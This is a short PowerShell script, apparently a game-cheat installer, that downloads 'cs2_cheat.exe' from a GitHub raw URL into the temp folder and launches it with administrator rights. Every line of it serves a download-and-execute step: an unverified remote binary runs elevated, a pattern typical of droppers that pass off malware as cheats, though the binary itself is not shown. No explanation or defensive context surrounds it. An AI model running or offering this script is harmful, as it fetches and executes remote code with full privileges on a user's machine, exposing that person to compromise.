$path = "$env:TEMP\cs2_cheat.exe"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Arsiw23/csgo-cheats/refs/heads/main/cs2_cheat.exe" -OutFile $path
Start-Process -FilePath $path -Verb RunAs
